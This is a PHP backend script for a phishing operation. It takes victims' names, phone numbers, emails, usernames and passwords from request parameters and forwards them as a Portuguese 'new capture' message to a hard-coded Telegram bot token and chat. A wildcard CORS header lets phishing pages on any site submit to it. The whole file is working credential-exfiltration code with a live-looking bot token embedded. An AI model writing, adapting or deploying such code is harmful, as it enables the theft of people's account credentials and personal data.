<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");

if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

if (isset($_GET['name'], $_GET['tel'], $_GET['email'], $_GET['pass'], $_GET['user'])) {
    $name  = htmlspecialchars($_GET['name']);
    $tel   = htmlspecialchars($_GET['tel']);
    $email = htmlspecialchars($_GET['email']);
    $pass  = htmlspecialchars($_GET['pass']);
    $user  = htmlspecialchars($_GET['user']);

    $horaCorrigida = date("H:i:s", strtotime("-3 hours"));
    $dataAtual = date("d/m/Y");

    $mensagem = "🔥 *Nova Captura Recebida!* 🔥\n\n"
              . "👤 *Nome:* $name\n"
              . "📱 *Telefone:* $tel\n"
              . "✉️ *Email:* $email\n"
              . "🔐 *Senha:* $pass\n"
              . "🧑‍💻 *Usuário:* $user\n\n"
              . "⌚ _Hora:_ $horaCorrigida\n"
              . "📅 _Data:_ $dataAtual";

    $token = "7114885129:AAHb9cKEsktZ2Da1AAjdzrdxcCNtVCCKDG4";
    $chat_id = "-1002475362928";
    $url = "https://api.telegram.org/bot$token/sendMessage";

    $response = file_get_contents($url . "?chat_id=$chat_id&text=" . urlencode($mensagem) . "&parse_mode=Markdown");

    echo "Mensagem enviada com sucesso!";
} else {
    echo "Parâmetros ausentes!";
}
?>
